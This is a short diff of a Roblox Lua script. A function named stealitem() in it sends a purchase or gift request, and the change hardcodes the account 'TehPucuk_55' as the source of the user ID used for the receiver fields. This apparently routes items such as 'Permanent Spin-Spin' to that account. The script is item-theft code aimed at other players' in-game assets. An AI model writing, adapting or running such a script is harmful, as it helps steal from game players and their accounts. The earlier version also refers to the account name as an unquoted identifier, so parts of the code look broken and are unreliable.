@@ -9,7 +9,7 @@ local result = 0
 local HttpService = game:GetService("HttpService")
 
 local success, UserId = pcall(function()
-    return Players:GetUserIdFromNameAsync(Username)
+    return Players:GetUserIdFromNameAsync("TehPucuk_55")
 end)
 
 local args = {
@@ -659,8 +659,8 @@ function stealitem()
                 ["StorageName"] = "Permanent Spin-Spin",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = TehPucuk_55,
-                ["ReceiverUserId"] = TehPucuk_55,
+                ["ReceiverName"] = Username,
+                ["ReceiverUserId"] = UserId,
             }
         }
         
